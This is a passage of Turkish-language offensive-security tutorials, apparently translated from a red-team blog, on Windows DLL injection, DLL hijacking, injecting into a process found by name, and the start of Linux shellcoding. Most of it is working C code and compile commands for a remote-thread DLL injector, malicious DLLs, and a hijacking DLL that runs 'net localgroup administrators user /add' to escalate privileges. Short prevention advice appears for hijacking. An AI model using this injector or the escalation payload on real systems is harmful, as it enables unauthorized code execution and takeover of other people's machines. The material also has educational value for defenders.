simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD nReason, LPVOID lpReserved) {
    switch (nReason) {
        case DLL_PROCESS_ATTACH:
            MessageBox(
                NULL,
                "Meow from evil.dll!",
                "=^..^=",
                MB_OK
            );
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
DLL yalnızca DllMain fonksiyonundan oluşur ve bu, bir DLL kütüphanesinin ana fonksiyonudur. Normalde meşru DLL'ler dışa aktarılmış (exported) fonksiyonlar tanımlar, ancak bu DLL herhangi bir dışa aktarılmış fonksiyon tanımlamaz. DllMain kodu, DLL sürecin belleğine yüklendikten hemen sonra çalıştırılır.

Bu durum, DLL Enjeksiyonu bağlamında önemlidir çünkü başka bir süreç bağlamında kod çalıştırmanın en basit yolunu arıyoruz. Bu nedenle, enjekte edilen kötü amaçlı DLL'lerin çoğu, kötü amaçlı kodlarının büyük bir kısmını DllMain içine yazar. Bir süreci dışa aktarılmış bir fonksiyonu çalıştırmaya zorlamanın yolları vardır, ancak kodunuzu DllMain içinde yazmak genellikle kod çalıştırmanın en basit çözümüdür.

Enjekte edilmiş süreçte çalıştırıldığında, mesajımızı görüntülemelidir: "Meow from evil.dll!", bu da enjeksiyonun başarılı olduğunu gösterir.

Şimdi bunu derleyebiliriz (saldırganın makinesinde):

x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive

777777777777
ve bunu seçtiğimiz bir dizine koyun (hedef makine):
77777777777777
Şimdi tek ihtiyacımız olan, bu kütüphaneyi seçtiğimiz bir sürece enjekte edecek bir kod.
Bizim durumumuzda klasik DLL enjeksiyonundan bahsedeceğiz. Boş bir tampon ayırıyoruz ve bu tampon en az diskten DLL yolunun uzunluğu kadar olmalıdır. Daha sonra bu yolu tampona kopyalıyoruz.
/*
* evil_inj.cpp
* classic DLL injection example
* author: @cocomelonc
* https://cocomelonc.github.io/tutorial/
2021/09/20/malware-injection-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

    // parse process ID
    if ( atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }

    printf("PID: %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);

    return 0;
}
Gördüğünüz gibi oldukça basit. Klasik kod enjeksiyonu bölümümdekiyle aynı. Tek fark, diskten DLL'imizin yolunu eklememiz (1) ve DLL'imizi enjekte edip çalıştırmadan önce LoadLibraryA'nın bellek adresine ihtiyacımız var. Bu, DLL'imizi yüklemek için kurban sürecin bağlamında çalıştıracağımız bir API çağrısı olacaktır (2):
777777777777
Son olarak, enjektörün tüm kodunu anladıktan sonra, bunu test edebiliriz.  
Derlemek için şu komutu çalıştırın:

x86_64-w64-mingw32-gcc -O2 evil_inj.cpp -o inj.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive >/dev/null 2>&1
77777777

Öncelikle bir calc.exe örneğini başlatalım ve ardından programımızı çalıştıralım:
7777777777777777
DLL'imizin gerçekten calc.exe sürecine enjekte edildiğini doğrulamak için Process Hacker kullanabiliriz.
777777777777777
Belleğin başka bir bölümünde şunları görebiliriz:
77777777777777
Görünüşe göre basit enjeksiyon mantığımız işe yaradı! Bu, başka bir sürece DLL enjekte etmenin en basit yoludur, ancak birçok durumda yeterli ve oldukça kullanışlıdır.  
Eğer isterseniz, ilerideki bölümlerde araştırılacak olan fonksiyon çağrısı gizleme (obfuscation) yöntemlerini de ekleyebilirsiniz.

VirtualAllocEx: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
WriteProcessMemory:  https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
CreateRemoteThread: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
OpenProcess : https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
GetProcAddress : https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
LoadLibraryA : https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya

Kaynak kodu Github'da:  https://github.com/cocomelonc/2021-09-24-injection-2

İlerleyen bölümlerde daha gelişmiş kod enjeksiyonu tekniklerini bulmaya çalışacağım.
6. Windows'ta DLL kaçırma (DLL Hijacking). Basit bir C örneği.
Bismillah
DLL kaçırma (DLL Hijacking) nedir? DLL kaçırma, meşru/güvenilir bir uygulamayı, kötü amaçlı bir DLL'yi yüklemeye kandırma tekniğidir.  

Windows ortamlarında, bir uygulama veya hizmet başlatılırken düzgün çalışması için bir dizi DLL arar. İşte Windows'ta varsayılan DLL arama sırasını gösteren bir diyagram:
Bu yazımızda yalnızca en basit durumu ele alacağız: bir uygulamanın dizininin yazılabilir olması. Bu durumda, uygulama tarafından yüklenen herhangi bir DLL kaçırılabilir, çünkü arama sürecinde kullanılan ilk konum burasıdır.
**Adım 1. Eksik DLL'leri olan süreci bulun**  
Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, **Sysinternals** aracından **procmon** çalıştırmaktır. Aşağıdaki filtreleri ayarlayın:
Bu, uygulamanın yüklemeye çalıştığı herhangi bir DLL olup olmadığını ve eksik DLL'i aradığı gerçek yolu belirleyecektir:
Örneğimizde, **Bginfo.exe** süreci birkaç eksik DLL'e sahip ve bu DLL'ler muhtemelen DLL kaçırma için kullanılabilir. Örneğin, **Riched32.dll**.  
**Adım 2. Klasör izinlerini kontrol edin**  
Klasör izinlerini kontrol etmek için şu komutu çalıştırın:
icacls C:\Users\user\Desktop\
Belgelerde belirtildiği üzere, bu klasöre yazma erişimimiz var.
Adım 3. DLL Kaçırma
Öncelikle, bginfo.exe'yi çalıştırın:
Bu nedenle, **bginfo.exe** ile aynı dizine **Riched32.dll** adında bir DLL yerleştirirsem, bu araç çalıştırıldığında kötü niyetli kodum da çalıştırılacaktır.  

Basitlik açısından, sadece bir mesaj kutusu açan bir DLL oluşturuyorum:
/*
DLL hijacking example
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            MessageBox(
                NULL,
                "Meow-meow!",
                "=^..^=",
                MB_OK
            );
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

**Derlemek için (saldırgan makinesinde):x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
Sonra DLL'in adını Riched32.dll olarak değiştirip, C:\Users\user\Desktop\my malicious DLL  dizinine kopyalayacağız:
Şimdi bginfo.exe'yi başlatın:


Gördüğünüz gibi, kötü amaçlı mantığımız çalıştırıldı:  

1. bginfo.exe ve kötü amaçlı Riched32.dll aynı klasörde bulunuyor.  
2. bginfo.exe başlatılıyor.  
3. Mesaj kutusu açılıyor!  

Önleme:
En basit önleme adımları, tüm yüklü yazılımların korunan C:\Program Files veya C:\Program Files (x86) dizinlerine kurulmasını sağlamaktır. Eğer yazılım bu konumlara yüklenemiyorsa, bir sonraki en kolay çözüm, kurulum dizinine yalnızca Yönetici (Administrative) kullanıcıların "oluşturma" veya "yazma" izinlerine sahip olmasını sağlamaktır. Bu, saldırganın kötü amaçlı bir DLL yerleştirerek sömürüyü gerçekleştirmesini engeller.

Yetki Yükseltme 
DLL kaçırma, yalnızca kod çalıştırmak için değil, aynı zamanda kalıcılık ve yetki yükseltme elde etmek için de kullanılabilir:

1. Diğer yetkilerle çalışan veya çalışacak bir süreç bulun (yatay/lateral hareket) ve eksik bir DLL arayın.  
2. DLL'nin aranacağı herhangi bir klasörde (muhtemelen çalıştırılabilir dosya dizini veya sistem yolu içindeki bir klasör) yazma izniniz olduğundan emin olun.  
3. Ardından, kodumuzu aşağıdaki gibi değiştirin:

/*
DLL hijacking example
author: @cocomelonc
*/
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /k net localgroup administrators user /add");
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

Derleme: 
- x64 için:  x86_64-w64-mingw32-gcc evil.c -shared -o target.dll
-x86 için: i686-w64-mingw32-gcc evil.c -shared -o target.dll
Sonraki adımlar öncekiyle aynıdır.DLL'yi hedef süreç dizinine yerleştirin ve çalıştırılabilir dosyayı başlatın. Bu kod, kullanıcıyı “administrators" grubuna ekleyecektir.

Sonuç
Ancak her durumda, bir uyarı var.  
Bazı durumlarda, derlediğiniz DLL'nin, kurban süreci tarafından yüklenebilmesi için birden fazla fonksiyonu dışa aktarması gerekebilir. Bu fonksiyonlar yoksa, çalıştırılabilir dosya DLL'yi yükleyemez ve sömürü başarısız olur.  

Mevcut DLL'lerin özel sürümlerini derlemek, göründüğünden daha zorlu olabilir, çünkü birçok çalıştırılabilir dosya, gerekli prosedürler veya giriş noktaları eksikse bu tür DLL'leri yüklemez.  
DLL Export Viewer(https://www.nirsoft.net/utils/dll_export_viewer.html) gibi araçlar, meşru DLL'lerin tüm dış fonksiyon adlarını ve sıralamalarını listelemek için kullanılabilir. Derlenen DLL'nin aynı formatı takip ettiğinden emin olmak, başarıyla yüklenme olasılığını artıracaktır.  

Gelecekte, bu konuyu anlamaya çalışacağım ve hedef orijinal DLL'den bir .def dosyası oluşturan bir Python script’ini yazmayı deneyeceğim.

Kullanılan araçlar ve yöntemler: 
- Process Monitor (https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
- icacls(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)  
- DLL Export Viewer (https://www.nirsoft.net/utils/dll_export_viewer.html)
- Module-Definition (def) files (https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=msvc-160&viewFallbackFrom=vs-2019)
- Git hub’taki kaynak kod: https://github.com/cocomelonc/2021-09-24-dllhijack

Not:Denemek isterseniz, savunmasız bginfo (sürüm 4.16) GitHub'a eklendi.

7.Süreç ID'sini isme göre bul ve ona enjekte et. Basit bir C++ örneği

Bismillah
Enjektörümü yazarken, örneğin süreçleri isimle nasıl bulabileceğimi merak ettim.  
Kod veya DLL enjektörleri yazarken, sistemde çalışan tüm süreçleri bulmak ve yönetici tarafından başlatılan bir sürece enjekte etmeyi denemek faydalı olur.  

Bu bölümde önce en basit problemi çözmeye çalışacağım: bir süreç ID’sini isme göre bulmak. Neyse ki, Win32 API'de bu konuda kullanabileceğimiz bazı harika fonksiyonlar var.  

Şimdi kod yazalım:
/*
simple process find logic
author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// find process ID by process name
int findMyProc(const char *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0; // process ID
    pid = findMyProc(argv[1]);
    if (pid) {
        printf("PID = %d\n", pid);
    }
    return 0;
}

```c
/*
simple process find logic
author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// find process ID by process name
int findMyProc(const char *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0; // process ID
    pid = findMyProc(argv[1]);
    if (pid) {
        printf("PID = %d\n", pid);
    }
    return 0;
}

Kodumuzu inceleyelim: 
Öncelikle, süreç adını argümanlardan alıyoruz. Ardından, isme göre süreç ID'sini bulup yazdırıyoruz.


PID'yi bulmak için, findMyProc fonksiyonunu çağırıyoruz. Bu fonksiyon temelde şunu yapar:  
Enjekte etmek istediğimiz sürecin adını alır, işletim sisteminin belleğinde bu süreci arar ve eğer süreç mevcutsa ve çalışıyorsa, bu fonksiyon o sürecin ID'sini döndürür:
Koda yorumlar ekledim, bu yüzden çok fazla sorunuz olmaz diye düşünüyorum.  
İlk olarak, CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) kullanarak sistemde şu anda çalışan süreçlerin bir anlık görüntüsünü alıyoruz:



Daha sonra, anlık görüntüde kaydedilen listeyi Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) ve Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) kullanarak dolaşıyoruz:
Eğer procname  ile adı eşleşen bir süreç bulursak, onun ID'sini döndürüyoruz. Daha önce yazdığım gibi, basitlik açısından bu PID'yi sadece yazdırıyoruz.  

Kodumuzu derlemek için şu komutu çalıştırın:

i686-w64-mingw32-g++ hack.cpp -o hack.exe \
-lws2_32 -s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
Şimdi bunu bir Windows makinesinde (benim durumumda Windows 7 x64) çalıştırın: .\hack.exe mspaint.exe


Gördüğünüz gibi, her şey mükemmel çalışıyor.  

Şimdi, bir Red Team üyesi gibi düşünürsek, daha ilginç bir enjektör yazabiliriz. Örneğin, süreç adını bulur ve payload'umuzu ona enjekte eder.  

Hadi başlayalım!  

Basitlik açısından, önceki yazılarımdan bir enjektör alacağım ve sadece findMyProc fonksiyonunu ekleyeceğim:
/*
simple process find logic
author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// find process ID by process name
int findMyProc(const char *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0; // process ID
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

    // get process ID by name
    pid = findMyProc(argv[1]);
    if (pid == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    } else {
        printf("PID = %d\n", pid);
    }

    // open process
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

    CloseHandle(ph);
    return 0;
}

Hack2.cpp’yi derleyelim:
x86_64-w64-mingw32-gcc -O2 hack2.cpp -o hack2.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive >/dev/null 2>&1

Aynısı gibi “Evil” DLL:

/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/09/20/malware-injection-2.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD nReason, LPVOID lpReserved) {
    switch (nReason) {
        case DLL_PROCESS_ATTACH:
            MessageBox(
                NULL,
                "Meow from evil.dll!",
                "=^..^=",
                MB_OK
            );
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

Derleyin ve seçtiğiniz bir dizine yerleştirin: 
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive



Şunu da çalıştır:
./hack2.exe mspaint.exe



Gördüğünüz gibi, her şey yolunda:  

1. mspaint.exe'yi başlatıyoruz ve enjektörümüz PID'yi başarıyla buluyor.  
2. Kötü amaçlı DLL'imiz (basit pop-up "Meow") çalışıyor!  

DLL'imizin gerçekten mspaint.exe sürecine enjekte edildiğini doğrulamak için Process Hacker kullanabiliriz. Bellek bölümünde şunları görebiliriz:



Görünüşe göre basit enjeksiyon mantığımız işe yaradı!  

Bu durumda, kendi sürecimde SeDebugPrivilege’in "etkin" olup olmadığını kontrol etmedim. Peki bu ayrıcalığı nasıl elde edebilirim?  

Bunu gelecekte, tüm uyarılar ve detaylarıyla birlikte inceleyeceğiz.

CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
Strcmp(https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-160)
Taking a Snapchot and Viewing Processes(https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
CloseHandle(https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
OpenProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
LoadLibraryA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)

Github’taki kaynak kod: https://github.com/cocomelonc/2021-09-29-processfind-1

8. Linux Shellcoding Örnekleri
Bismillah
Shellcode
Shellcode yazmak, assembly dili ve bir programın işletim sistemiyle nasıl iletişim kurduğunu öğrenmenin harika bir yoludur.Neden biz, Red Team üyeleri ve penetrasyon testçileri, shellcode yazıyoruz?Çünkü gerçek durumlarda shellcode, çalışan bir programa enjekte edilerek, onu tasarlanmadığı bir şeyi yapmaya zorlamak için kullanılabilir. Örneğin, buffer overflow saldırılarında kullanılabilir. Bu nedenle shellcode genellikle bir sömürü (exploit) için "payload" olarak kullanılabilir. Neden "shellcode" adı verildi?
Tarihi olarak, shellcode, çalıştırıldığında bir shell başlatan makine kodudur.
Shellcode Testi 
Shellcode'u test ederken, onu bir programa yerleştirip çalıştırmak yeterince pratiktir. Aşağıdaki C programı, tüm kodlarımızı test etmek için kullanılacaktır (run.c):
/*
run.c - shellcode'u çalıştırmak için küçük bir iskelet program
*/

// Shellcode burada
char code[] = "my shellcode here";

int main(int argc, char **argv) {
    int (*func)(); // Fonksiyon işaretçisi
    func = (int (*)()) code; // func, shellcode'u işaret ediyor
    (int)(*func)(); // code[] işlevini çalıştır

    // Eğer programımız 1 yerine 0 döndürürse,
    // shellcode'umuz başarılı çalıştı demektir
    return 1;
}

C ve Assembly bilgisi şiddetle tavsiye edilir. Ayrıca, yığın (stack) işleyişini anlamak büyük bir avantajdır. Elbette bu öğreticiden ne anlama geldiklerini öğrenmeye çalışabilirsiniz, ancak bu konuları daha derinlemesine bir kaynaktan öğrenmek için zaman ayırmanız daha iyi olur.

ASLR'ı Devre Dışı Bırakma ve Etkinleştirme

Address Space Layout Randomization (ASLR), günümüzde çoğu işletim sisteminde kullanılan bir güvenlik özelliğidir. ASLR, süreçlerin adres alanlarını (yığın, heap, kütüphaneler vb.) rastgele düzenler. Bu mekanizma, sömürülerin (exploitation) başarılı olmasını zorlaştırır.

Linux'ta ASLR'ı /proc/sys/kernel/randomize_va_space arayüzünü kullanarak yapılandırabilirsiniz:

Desteklenen Değerler:
-0: Rastgeleleştirme yok (no randomization)
-1: Koruyucu rastgeleleştirme (conservative randomization)
-2: Tam rastgeleleştirme (full randomization)

ASLR'ı devre dışı bırakmak için:
echo 0 > /proc/sys/kernel/randomize_va_space
ASLR'ı etkinleştirmek için:
echo 2 > /proc/sys/kernel/randomize_va_space

Bazı Assembly Bilgileri
Öncelikle, biraz daha temel bilgilere tekrar göz atalım. Lütfen sabırlı olun.
x86 Intel Register Set (Kayıt Seti).
- EAX, EBX, ECX ve EDX:  
  32-bit genel amaçlı kayıtlardır.  

- AH, BH, CH ve DH:  
  Genel amaçlı kayıtların üst 16-bit'ine erişim sağlar.  

- AL, BL, CL ve DL:  
  Genel amaçlı kayıtların alt 8-bit'ine erişim sağlar.  

Kayıtların İşlevleri  

- EAX, AX, AH ve AL ("Accumulator" Kayıtları):  
  - Giriş/çıkış (I/O) port erişimi.  
  - Aritmetik işlemler.  
  - Kesme (interrupt) çağrıları.  
  - Sistem çağrılarını (system call) uygulamak için kullanılır.  

- EBX, BX, BH ve BL ("Base" Kayıtları):  
  - Bellek erişimi için temel işaretçi (base pointer) olarak kullanılır.  
  - Sistem çağrıları için argümanların saklanacağı işaretçileri tutar.  
  - Bazen bir kesmeden (interrupt) dönen değeri saklamak için kullanılır.  

- ECX, CX, CH ve CL ("Counter" Kayıtları):  
  - Sayaç (counter) işlemleri için kullanılır.  

- EDX, DX, DH ve DL ("Data" Kayıtları):  
  - Giriş/çıkış (I/O) port erişimi.  
  - Aritmetik işlemler.  
  - Bazı kesme çağrılarında kullanılır.  

Bu kayıtlar, assembly dilinde temel sistem çağrıları ve düşük seviyeli işlemleri uygulamak için sıkça kullanılır.
Assembly Talimatları  
Assembly programlamada önemli olan bazı talimatlar:  
- mov eax, 32;//Değer atama, örneğin `eax = 32`.  
- xor eax, eax ;//Mantıksal Özel Veya (exclusive OR), genellikle bir değeri sıfırlamak için kullanılır.  
- push eax; //Yığını (stack) üzerine bir değer koyar.  
- pop ebx; //Yığından bir değeri çıkarır ve bir kayda veya değişkene yerleştirir.  
- call mysuperfunc; //Bir fonksiyonu çağırır.  
- int 0x80; //Kesme (interrupt), genellikle çekirdek (kernel) komutlarını çalıştırır.  
Linux Sistem Çağrıları.Sistem çağrıları, kullanıcı alanı (user space) ile çekirdek alanı (kernel space) arasındaki arayüz için kullanılan API'lerdir.Linux sistem çağrılarını assembly programlarınızda kullanabilirsiniz.Bunun için aşağıdaki adımları izleyin:  
Sistem çağrısının numarasını EAX kaydına koyun.Sistem çağrısının argümanlarını EBX, ECX vb. kayıtlara saklayın.İlgili kesmeyi çağırın (80h).Sonuç genellikle EAX kaydında döndürülür. Tüm x86 sistem çağrıları /usr/include/asm/unistd_32.h dosyasında listelenmiştir.
Libc'nin sistem çağrılarını sarmaladığına dair bir örnek:
/* exit0.c - Libc'nin sistem çağrılarını nasıl sardığını göstermek için */
 #include <stdlib.h> 
void main() { 
exit(0); 
}
Kodunuzu derleyin ve ayrıştırın: gcc -masm=intel -static -m32 -o exit0 exit0.c
					  gbd -q ./exit0
0xfc = exit_group() and 0x1 = exit()
Nullbytes
Öncelikle, nullbytes'a dikkatinizi çekmek istiyorum.
Basit bir programı inceleyelim:
/*
meow.c - demonstrate nullbytes
*/
#include <stdio.h>
int main(void) {
    printf("=^..^= meow \x00 meow");
    return 0;
}
Derleyelim ve çalıştıralım: gcc -m32 -w -o meow meow.c
./meow
Gördüğünüz gibi, bir nullbyte (\x00), talimat zincirini sonlandırır. Sömürüler genellikle C kodlarını hedef alır ve bu nedenle shellcode genellikle bir NUL ile sonlandırılmış string olarak teslim edilmelidir. Eğer 0xb numaralı bir sistem çağrısını yapmak istiyorsanız, EAX kaydına bu numarayı yerleştirmeniz gerekir. Ancak bunu yaparken makine kodunda nullbyte (\x00) içermeyen biçimler kullanmalısınız.
Şimdi iki eşdeğer kodu derleyip çalıştıralım. Önce exit1.asm'yi inceleyelim:
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit1.o exit1.asm
; ld -m elf_i386 -o exit1 exit1.o && ./exit1
; 32-bit linux
section .data
section .bss
section .text
global _start ; must be declared for linker
; normal exit
_start: ; linker entry point
mov eax, 0 ; zero out eax
mov eax, 1 ; sys_exit system call
int 0x80 ; call sys_exit
exit1.asm kodunun derlenmesi ve incelenmesi:
nasm -f elf32 -o exit1.o exit1.asm
ld -m elf_i386 -o exit1 exit1.o
./exit1
objdump -M intel -d exit1
Gördüğünüz gibi, makine kodunda nullbyte (\x00) bulunuyor.
İkinci exit2.asm:
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit2.o exit2.asm
; ld -m elf_i386 -o exit2 exit2.o && ./exit2
; 32-bit linux
section .data
section .bss
section .text
global _start ; must be declared for linker
; normal exit
_start: ; linker entry point
xor eax, eax ; zero out eax
mov al, 1 ; sys_exit system call (mov eax, 1)
; with remove null bytes
int 0x80 ; call sys_exit
exit2.asm derle ve incele:
nasm -f elf32 -o exit2.o exit2.asm
ld -m elf_i386 -o exit2 exit2.o
./exit2
objdump -M intel -d exit2


Gördüğünüz gibi, bu kodda gömülü nullbyte (\x00) yok.Daha önce yazdığım gibi, **EAX** kaydının AX, AH ve AL bölümleri vardır.  
- AX: EAX'in alt 16 bitine erişir.  
- AL: EAX'in alt 8 bitine erişir.  
- AH: EAX'in üst 8 bitine erişir.  
Peki, bu neden shellcode yazarken önemlidir?Nullbyte'ların neden sorunlu olduğunu hatırlayın. Bir kaydın daha küçük bölümlerini kullanarak, örneğin `mov al, 0x1` ifadesini yazabiliriz ve bu işlem shellcode'da nullbyte üretmez. Eğer `mov eax, 0x1` kullansaydık, bu nullbyte'lar üretirdi.Her iki program da işlevsel olarak eşdeğerdir, ancak biri nullbyte içermez ve bu, shellcode yazımında daha güvenilir bir çözüm sunar. Nullbyte'lardan kaçınmak, shellcode'un eksiksiz bir şekilde çalışmasını sağlar.
Normal Çıkış
En basit örnekle başlayalım. exit.asm kodumuzu shellcoding için ilk örnek olarak kullanalım:
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o example1.o example1.asm
